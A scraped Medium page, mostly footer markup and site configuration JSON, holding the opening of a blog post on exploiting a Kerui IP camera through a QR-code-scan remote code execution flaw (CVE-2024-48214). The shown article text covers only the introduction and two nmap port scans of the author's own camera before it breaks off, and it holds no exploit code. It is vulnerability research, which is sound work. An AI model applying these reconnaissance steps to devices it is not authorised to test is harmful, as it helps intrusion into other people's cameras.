fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="qx l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab qy qz ra iu it"><div class="rb rc rd re rf rg rh ri rj rk ab cp"><div class="h k"><a tabindex="0" rel="noopener follow" href="/@shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------"><div class="l fj"><img alt="Shenhav Mor" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*mkR0enbxPtj253Og74Bbig.jpeg" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay rl"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/@shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------"><div class="l fj"><img alt="Shenhav Mor" class="l fd by rm rn cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*mkR0enbxPtj253Og74Bbig.jpeg" width="64" height="64" loading="lazy"/><div class="fr by l rm rn fs n ay rl"></div></div></a></div><div class="j i d ro is"><div class="ab"><span><button class="bf b bg z rp qc rq rr rs rt ru ev ew rv rw rx fa fb fc fd bm fe ff">Follow</button></span></div></div></div><div class="ab co ry"><div class="rz sa sb sc sd l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/@shenhavmor?source=post_page---post_author_info--2d56848870c2--------------------------------"><h2 class="pw-author-name bf sf sg sh si sj sk sl mq sm sn mu so sp my sq sr bk"><span class="gn se">Written by <!-- -->Shenhav Mor</span></h2></a><div class="qa ab ia"><div class="l is"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/@shenhavmor/followers?source=post_page---post_author_info--2d56848870c2--------------------------------">2 Followers</a></span></div><div class="bf b bg z du ab ss"><span class="im l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/@shenhavmor/following?source=post_page---post_author_info--2d56848870c2--------------------------------">2 Following</a></div></div><div class="st l"></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z rp qc rq rr rs rt ru ev ew rv rw rx fa fb fc fd bm fe ff">Follow</button></span></div></div></div></div></div></div><div class="su l"><div class="sv bh r qx"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf sf ot ov ow ox oz pa pb pd pe pf ph pi pj pl pm bk">No responses yet</h2><div class="ab sw"><div><div class="bm" aria-hidden="false"><a class="sx sy" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--2d56848870c2--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="sz ta tb tc td l"></div></div></div></div><div class="te tf tg th ti l bx"><div class="h k j"><div class="sv bh tj tk"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="tl ab ke iv"><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/about?autoplay=1&amp;source=post_page-----2d56848870c2--------------------------------"><p class="bf b dv z du">About</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----2d56848870c2--------------------------------"><p class="bf b dv z du">Careers</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="tm tn l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----2d56848870c2--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="tm l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/business?source=post_page-----2d56848870c2--------------------------------"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250110-154215-d58a2d1ab2"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-2d56848870c2","user-f1f06bd2dad8"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"DEFAULT","explicit":false},"viewerIsBot":false},"debug":{"requestId":"f5425018-6c57-4ad6-8ef4-9171f708c4b2","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-350b51c86f17c02bcbca459af403d622-76f7a8d250efb647-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002F@shenhavmor\u002Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250110-154215-d58a2d1ab2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250110-154215-d58a2d1ab2","commit":"d58a2d1ab2df37007c05f758ad444c4fe1e39591"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"medium.com\"})":null,"postResult({\"id\":\"2d56848870c2\"})":{"__ref":"Post:2d56848870c2"}},"LinkedAccounts:f1f06bd2dad8":{"__typename":"LinkedAccounts","mastodon":null,"id":"f1f06bd2dad8"},"User:f1f06bd2dad8":{"__typename":"User","id":"f1f06bd2dad8","linkedAccounts":{"__ref":"LinkedAccounts:f1f06bd2dad8"},"isSuspended":false,"name":"Shenhav Mor","imageId":"1*mkR0enbxPtj253Og74Bbig.jpeg","customDomainState":null,"hasSubdomain":false,"username":"shenhavmor","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":2,"followingCount":1,"collectionFollowingCount":1},"bio":"","membership":null,"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:f1f06bd2dad8-viewerId:lo_2246cba9c8b2"},"twitterScreenName":""},"Paragraph:21b108638587_0":{"__typename":"Paragraph","id":"21b108638587_0","name":"9129","type":"H3","href":null,"layout":null,"metadata":null,"text":"Exploiting a Chinese camera for fun CVE-2024–48214","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_1":{"__typename":"Paragraph","id":"21b108638587_1","name":"00c7","type":"P","href":null,"layout":null,"metadata":null,"text":"Kerui IP camera QR Code scan to RCE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_2":{"__typename":"Paragraph","id":"21b108638587_2","name":"d10c","type":"P","href":null,"layout":null,"metadata":null,"text":"Introduction","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_3":{"__typename":"Paragraph","id":"21b108638587_3","name":"4fc8","type":"P","href":null,"layout":null,"metadata":null,"text":"CVE-2024–48214 is a QR code scan to RCE on KERUI IP Camera","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":43,"end":58,"href":"https:\u002F\u002Fwww.keruistore.com\u002Fkerui-hd-3mp-1080p-tuya-app-ip-camera.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_4":{"__typename":"Paragraph","id":"21b108638587_4","name":"8d69","type":"P","href":null,"layout":null,"metadata":null,"text":"This article primarily discusses the key aspects of the CVE, The research journey was both fun and led to various other directions. My goal is to provide a comprehensive overview of the IoT research process while keeping it concise. Digging into every detail would turn this into a book — and that’s not our purpose here.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_5":{"__typename":"Paragraph","id":"21b108638587_5","name":"c54e","type":"P","href":null,"layout":null,"metadata":null,"text":"So how did I start my research journey?","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":39,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_6":{"__typename":"Paragraph","id":"21b108638587_6","name":"3e10","type":"P","href":null,"layout":null,"metadata":null,"text":"Bought a camera from Aliexpress and wanted it to be cheap (since I buy the products I research), found something that looked legit (hundreds of thousands of sales, etc), and also had many features. So I bought 2 of these. It has arrived, and now we have a box, and our game begins.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_7":{"__typename":"Paragraph","id":"21b108638587_7","name":"f2b7","type":"P","href":null,"layout":null,"metadata":null,"text":"Nmap","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":4,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_8":{"__typename":"Paragraph","id":"21b108638587_8","name":"7b0b","type":"P","href":null,"layout":null,"metadata":null,"text":"First we would like to check if there are any open ports to the camera, maybe we have TELNET or anything we can quick check.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_9":{"__typename":"Paragraph","id":"21b108638587_9","name":"1378","type":"P","href":null,"layout":null,"metadata":null,"text":"we tried a few simple classic scans:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_10":{"__typename":"Paragraph","id":"21b108638587_10","name":"c3bd","type":"PRE","href":null,"layout":null,"metadata":null,"text":"sudo nmap -sC -sV -oN normal.txt 192.168.1.178","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ku2pqwf0XArLawF0NUhCWg.png":{"__typename":"ImageMetadata","id":"1*ku2pqwf0XArLawF0NUhCWg.png","originalHeight":184,"originalWidth":855,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:21b108638587_11":{"__typename":"Paragraph","id":"21b108638587_11","name":"592c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ku2pqwf0XArLawF0NUhCWg.png"},"text":"Output for the normal scan","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:21b108638587_12":{"__typename":"Paragraph","id":"21b108638587_12","name":"b61c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"sudo nmap -p- -oN all_ports.txt 